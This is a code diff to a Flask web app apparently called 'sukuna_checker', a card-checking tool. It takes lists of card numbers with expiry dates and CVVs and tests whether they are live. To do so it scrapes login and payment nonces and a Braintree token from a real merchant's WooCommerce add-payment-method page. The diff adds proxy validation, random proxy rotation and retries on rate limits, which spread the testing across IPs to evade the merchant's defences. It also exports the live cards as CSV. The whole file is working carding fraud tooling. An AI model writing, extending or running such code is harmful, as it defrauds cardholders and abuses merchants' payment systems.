@@ -1,3 +1,4 @@
+
 from flask import Flask, render_template_string, request, jsonify, send_file, session
 import threading
 import time
@@ -14,7 +15,8 @@ from cryptography.hazmat.primitives.hmac import HMAC
 import requests
 from datetime import datetime
 import csv
-from io import StringIO  # Changed from BytesIO to StringIO
+from io import StringIO, BytesIO
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__)
 app.secret_key = 'sukuna_checker_secret_key_2023'
@@ -140,6 +142,10 @@ HTML_TEMPLATE = """
             letter-spacing: 1px;
         }
         
+        .required {
+            color: var(--danger-color);
+        }
+        
         .form-control, .form-select {
             background-color: rgba(0, 0, 0, 0.6);
             border: 1px solid var(--primary-color);
@@ -168,7 +174,7 @@ HTML_TEMPLATE = """
             transition: all 0.3s ease;
             text-transform: uppercase;
             margin: 5px;
-            min-width: 150px; /* Ensure buttons have a minimum width */
+            min-width: 150px;
         }
         
         .btn-custom:hover {
@@ -238,6 +244,14 @@ HTML_TEMPLATE = """
             border-left: 4px solid var(--warning-color);
         }
         
+        .proxy-live {
+            border-left: 4px solid var(--success-color);
+        }
+        
+        .proxy-dead {
+            border-left: 4px solid var(--danger-color);
+        }
+        
         .status-badge {
             padding: 5px 15px;
             border-radius: 20px;
@@ -260,6 +274,16 @@ HTML_TEMPLATE = """
         .status-error {
             background-color: var(--warning-color);
             color: var(--bg-color);
+        }
+        
+        .status-live {
+            background-color: var(--success-color);
+            color: var(--bg-color);
+        }
+        
+        .status-dead {
+            background-color: var(--danger-color);
+            color: var(--text-color);
         }
         
         .loading-spinner {
@@ -461,6 +485,21 @@ HTML_TEMPLATE = """
                 
                 <div class="card">
                     <div class="card-header">
+                        <h3><i class="fas fa-server"></i> PROXIES <span class="required">(Required)</span> (format: username:password@domain:port)</h3>
+                    </div>
+                    <div class="card-body">
+                        <textarea class="form-control" id="proxyInput" rows="5" placeholder="username:password@proxy1.example.com:8080&#10;username:password@proxy2.example.com:8080&#10;username:password@proxy3.example.com:8080" required></textarea>
+                        <div class="mt-2">
+                            <button class="btn btn-custom" id="checkProxyBtn" onclick="checkProxies()">
+                                <i class="fas fa-shield-alt"></i> Check Proxies
+                            </button>
+                            <div class="loading-spinner" id="proxyLoadingSpinner"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header">
                         <h3><i class="fas fa-server"></i> Payment Gateway</h3>
                     </div>
                     <div class="card-body">
@@ -578,11 +617,81 @@ HTML_TEMPLATE = """
             }, 5000);
         }
         
+        function checkProxies() {
+            const proxies = document.getElementById('proxyInput').value.trim();
+            
+            if (!proxies) {
+                showAlert('Please enter proxies to check');
+                return;
+            }
+            
+            document.getElementById('checkProxyBtn').disabled = true;
+            document.getElementById('proxyLoadingSpinner').style.display = 'inline-block';
+            
+            fetch('/check_proxies', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'proxies=' + encodeURIComponent(proxies)
+            })
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('checkProxyBtn').disabled = false;
+                document.getElementById('proxyLoadingSpinner').style.display = 'none';
+                
+                if (data.status === 'success') {
+                    updateProxyResults(data.results);
+                    showAlert(`Proxy check completed: ${data.live_count} live, ${data.dead_count} dead`);
+                } else {
+                    showAlert('Error checking proxies');
+                }
+            })
+            .catch(error => {
+                document.getElementById('checkProxyBtn').disabled = false;
+                document.getElementById('proxyLoadingSpinner').style.display = 'none';
+                showAlert('Error checking proxies');
+            });
+        }
+        
+        function updateProxyResults(proxyResults) {
+            const container = document.getElementById('resultsContainer');
+            
+            let html = '';
+            proxyResults.forEach(result => {
+                const statusClass = result.status === 'LIVE' ? 'proxy-live' : 'proxy-dead';
+                const badgeClass = result.status === 'LIVE' ? 'status-live' : 'status-dead';
+                
+                html += `
+                    <div class="result-item ${statusClass}">
+                        <div class="d-flex justify-content-between align-items-start">
+                            <div class="flex-grow-1">
+                                <div class="terminal-effect mb-2">${result.proxy}</div>
+                                <div class="result-message">${result.message}</div>
+                            </div>
+                            <div class="text-end">
+                                <span class="status-badge ${badgeClass}">${result.status}</span>
+                                <div class="result-time">${result.time}s</div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+        
         function startChecking() {
             const cards = document.getElementById('cardInput').value.trim();
+            const proxies = document.getElementById('proxyInput').value.trim();
             
             if (!cards) {
                 showAlert('Please enter cards to check');
+                return;
+            }
+            
+            if (!proxies) {
+                showAlert('Please enter proxies. Proxies are required for checking.');
                 return;
             }
             
@@ -599,12 +708,15 @@ HTML_TEMPLATE = """
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: 'cards=' + encodeURIComponent(cards)
+                body: 'cards=' + encodeURIComponent(cards) + '&proxies=' + encodeURIComponent(proxies)
             })
             .then(response => response.json())
             .then(data => {
                 if (data.status === 'already_running') {
                     showAlert('Checking is already running');
+                } else if (data.status === 'no_proxies') {
+                    showAlert('Please enter proxies. Proxies are required for checking.');
+                    stopChecking();
                 }
             });
             
@@ -784,6 +896,8 @@ HTML_TEMPLATE = """
 checking = False
 threads = []
 results = []
+proxy_results = []
+live_proxies = []
 stats = {
     "total": 0,
     "live": 0,
@@ -861,7 +975,84 @@ def generate_random_code(length=32):
     letters_and_digits = string.ascii_letters + string.digits
     return ''.join(random.choice(letters_and_digits) for _ in range(length))
 
-def check_card(card_data):
+def check_proxy(proxy):
+    start_time = time.time()
+    
+    try:
+        # Parse proxy string
+        if '@' in proxy:
+            auth_part, addr_part = proxy.split('@', 1)
+            if ':' in auth_part:
+                username, password = auth_part.split(':', 1)
+            else:
+                username = auth_part
+                password = ''
+            
+            if ':' in addr_part:
+                host, port = addr_part.split(':', 1)
+            else:
+                host = addr_part
+                port = '8080'
+        else:
+            # No authentication provided
+            username = ''
+            password = ''
+            if ':' in proxy:
+                host, port = proxy.split(':', 1)
+            else:
+                host = proxy
+                port = '8080'
+        
+        # Create proxy dictionary for requests
+        if username and password:
+            proxy_dict = {
+                'http': f'http://{username}:{password}@{host}:{port}',
+                'https': f'http://{username}:{password}@{host}:{port}'
+            }
+        else:
+            proxy_dict = {
+                'http': f'http://{host}:{port}',
+                'https': f'http://{host}:{port}'
+            }
+        
+        # Test proxy by making a request to a fast API
+        test_url = 'http://httpbin.org/ip'
+        response = requests.get(
+            test_url,
+            proxies=proxy_dict,
+            timeout=5  # Reduced timeout for faster checking
+        )
+        
+        if response.status_code == 200:
+            processing_time = round(time.time() - start_time, 2)
+            return {
+                "proxy": proxy,
+                "status": "LIVE",
+                "message": f"Proxy is working. IP: {response.json().get('origin', 'Unknown')}",
+                "time": processing_time,
+                "proxy_dict": proxy_dict
+            }
+        else:
+            processing_time = round(time.time() - start_time, 2)
+            return {
+                "proxy": proxy,
+                "status": "DEAD",
+                "message": f"Proxy returned status code: {response.status_code}",
+                "time": processing_time,
+                "proxy_dict": None
+            }
+    
+    except Exception as e:
+        processing_time = round(time.time() - start_time, 2)
+        return {
+            "proxy": proxy,
+            "status": "DEAD",
+            "message": f"Error: {str(e)}",
+            "time": processing_time,
+            "proxy_dict": None
+        }
+
+def check_card(card_data, proxy_dict=None):
     global stats, results
     
     card_number, exp_month, exp_year, cvv = card_data.split('|')
@@ -873,6 +1064,10 @@ def check_card(card_data):
     corr = generate_random_code()
     sess = generate_random_code()
     r = requests.session()
+    
+    # Set proxy if provided
+    if proxy_dict:
+        r.proxies.update(proxy_dict)
     
     try:
         headers = {
@@ -893,7 +1088,10 @@ def check_card(card_data):
         }
 
         r1 = r.get('https://arrows-uk.com/my-account/add-payment-method/', headers=headers, timeout=30)
-        nonce = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', r1.text).group(1)
+        nonce_match = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', r1.text)
+        if not nonce_match:
+            raise Exception("Could not find login nonce")
+        nonce = nonce_match.group(1)
 
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -944,8 +1142,15 @@ def check_card(card_data):
         }
 
         r3 = r.get('https://arrows-uk.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, timeout=30)
-        noncec = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text).group(1)
-        token = parseX(r3.text, 'var wc_braintree_client_token = ["', '"];')
+        noncec_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text)
+        if not noncec_match:
+            raise Exception("Could not find payment method nonce")
+        noncec = noncec_match.group(1)
+        
+        token_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', r3.text)
+        if not token_match:
+            raise Exception("Could not find Braintree client token")
+        token = token_match.group(1)
         token = json.loads(base64.b64decode(token))['authorizationFingerprint']
 
         headers = {
@@ -1143,31 +1348,116 @@ def check_card(card_data):
         
         return result
 
-def process_cards(cards):
-    global checking
+def process_cards(cards, proxies=None):
+    global checking, live_proxies
     
     for card in cards:
         if not checking:
             break
             
-        # Retry up to 2 times if failed
+        # Use a random proxy for each card
+        proxy_dict = None
+        if live_proxies:
+            # Rotate through live proxies
+            proxy_dict = random.choice(live_proxies)
+        
+        # Retry up to 3 times if failed
         for attempt in range(3):
             try:
-                result = check_card(card)
-                if result["status"] != "ERROR":
-                    break
-            except:
+                result = check_card(card, proxy_dict)
+                
+                # Check for retry conditions
+                if result["status"] == "ERROR":
+                    # Always retry on errors
+                    if attempt < 2:
+                        time.sleep(5)  # Wait before retry
+                        continue
+                elif "wait for 20 seconds" in result["message"].lower():
+                    # Retry on 20-second error
+                    if attempt < 2:
+                        time.sleep(25)  # Wait a bit longer than required
+                        continue
+                elif "'NoneType' object has no attribute 'group'" in result["message"] or "'list' object has no attribute 'group'" in result["message"]:
+                    # Retry on group errors
+                    if attempt < 2:
+                        time.sleep(5)  # Wait before retry
+                        continue
+                
+                # If we get here, either we succeeded or we've exhausted retries
+                break
+                
+            except Exception as e:
                 if attempt == 2:  # Last attempt
-                    check_card(card)  # Add as error
-                time.sleep(2)  # Wait before retry
+                    # Add as error
+                    processing_time = round(time.time() - start_time, 2)
+                    stats["total"] += 1
+                    stats["dead"] += 1
+                    
+                    if stats["total"] > 0:
+                        stats["success_rate"] = round((stats["live"] / stats["total"]) * 100, 2)
+                        stats["avg_time"] = round(((stats["avg_time"] * (stats["total"] - 1)) + processing_time) / stats["total"], 2)
+                    
+                    result = {
+                        "card": card,
+                        "status": "ERROR",
+                        "message": str(e),
+                        "time": processing_time
+                    }
+                    results.append(result)
+                else:
+                    time.sleep(5)  # Wait before retry
 
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
+@app.route('/check_proxies', methods=['POST'])
+def check_proxies():
+    global proxy_results, live_proxies
+    
+    proxies = request.form.get('proxies').strip().split('\n')
+    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
+    
+    if not proxies:
+        return jsonify({"status": "no_proxies"})
+    
+    proxy_results = []
+    live_proxies = []
+    
+    # Check proxies in parallel with increased workers for faster checking
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}
+        
+        for future in as_completed(future_to_proxy):
+            proxy = future_to_proxy[future]
+            try:
+                result = future.result()
+                proxy_results.append(result)
+                
+                if result["status"] == "LIVE":
+                    live_proxies.append(result["proxy_dict"])
+            except Exception as e:
+                proxy_results.append({
+                    "proxy": proxy,
+                    "status": "DEAD",
+                    "message": f"Error: {str(e)}",
+                    "time": 0,
+                    "proxy_dict": None
+                })
+    
+    live_count = sum(1 for result in proxy_results if result["status"] == "LIVE")
+    dead_count = len(proxy_results) - live_count
+    
+    return jsonify({
+        "status": "success",
+        "results": proxy_results,
+        "live_count": live_count,
+        "dead_count": dead_count
+    })
+
 @app.route('/start', methods=['POST'])
 def start_checking():
-    global checking, threads, results, stats
+    global checking, threads, results, stats, live_proxies
     
     if checking:
         return jsonify({"status": "already_running"})
@@ -1175,8 +1465,14 @@ def start_checking():
     cards = request.form.get('cards').strip().split('\n')
     cards = [card.strip() for card in cards if card.strip()]
     
+    proxies = request.form.get('proxies', '').strip()
+    proxy_list = [proxy.strip() for proxy in proxies.split('\n')] if proxies else []
+    
     if not cards:
         return jsonify({"status": "no_cards"})
+    
+    if not proxy_list:
+        return jsonify({"status": "no_proxies"})
     
     checking = True
     results = []
@@ -1188,6 +1484,28 @@ def start_checking():
         "avg_time": 0
     }
     
+    # If we don't have live proxies yet, check them first
+    if not live_proxies:
+        # Check proxies in parallel with increased workers for faster checking
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            future_to_proxy = {executor.submit(check_proxy, proxy): proxy for proxy in proxy_list}
+            
+            for future in as_completed(future_to_proxy):
+                proxy = future_to_proxy[future]
+                try:
+                    result = future.result()
+                    
+                    if result["status"] == "LIVE":
+                        live_proxies.append(result["proxy_dict"])
+                except Exception as e:
+                    # Skip dead proxies
+                    pass
+    
+    # If still no live proxies, return error
+    if not live_proxies:
+        checking = False
+        return jsonify({"status": "no_live_proxies"})
+    
     # Split cards into chunks for threading (3 threads)
     chunk_size = max(1, len(cards) // 3)
     card_chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
@@ -1195,12 +1513,12 @@ def start_checking():
     # Start threads
     threads = []
     for chunk in card_chunks:
-        thread = threading.Thread(target=process_cards, args=(chunk,))
+        thread = threading.Thread(target=process_cards, args=(chunk, proxy_list))
         thread.daemon = True
         thread.start()
         threads.append(thread)
     
-    return jsonify({"status": "started"})
+    return jsonify({"status": "started", "total_cards": len(cards)})
 
 @app.route('/stop', methods=['POST'])
 def stop_checking():
@@ -1251,8 +1569,8 @@ def export_results(type):
     if not filtered_results:
         return jsonify({"status": "no_results", "message": f"No {type} cards to download"})
     
-    # Create CSV using StringIO instead of BytesIO
-    output = StringIO()  # Changed from BytesIO to StringIO
+    # Create CSV using StringIO
+    output = StringIO()
     writer = csv.writer(output)
     writer.writerow(["Card", "Status", "Response", "Time (s)"])
     
@@ -1262,10 +1580,10 @@ def export_results(type):
     output.seek(0)
     
     # Convert StringIO to bytes for send_file
-    output_bytes = output.getvalue().encode('utf-8')  # Convert string to bytes
+    output_bytes = output.getvalue().encode('utf-8')
     
     return send_file(
-        BytesIO(output_bytes),  # Use BytesIO with the converted bytes
+        BytesIO(output_bytes),
         mimetype='text/csv',
         as_attachment=True,
         download_name=filename
